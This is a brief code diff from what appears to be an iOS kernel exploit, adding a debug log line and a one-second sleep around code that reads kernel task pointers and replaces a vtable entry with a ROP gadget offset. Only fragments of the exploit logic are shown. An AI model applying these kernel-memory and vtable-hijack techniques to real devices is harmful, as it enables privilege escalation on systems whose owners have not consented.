@@ -1002,6 +1002,8 @@ goto out; \
         goto out;
     }
     
+    LOG("XXX: " ADDR, itk_space + off->ipc_space_is_task);
+    
     kptr_t self_task = 0;
     KREAD(itk_space + off->ipc_space_is_task, &self_task, sizeof(self_task));
     LOG("self_task: " ADDR, self_task);
@@ -1065,6 +1067,8 @@ goto out; \
     {
         goto out;
     }
+    
+    sleep(1);
     
     vtab[off->vtab_get_external_trap_for_index] = OFFSET_ROP_LDR_X0_X0_0x10;
     
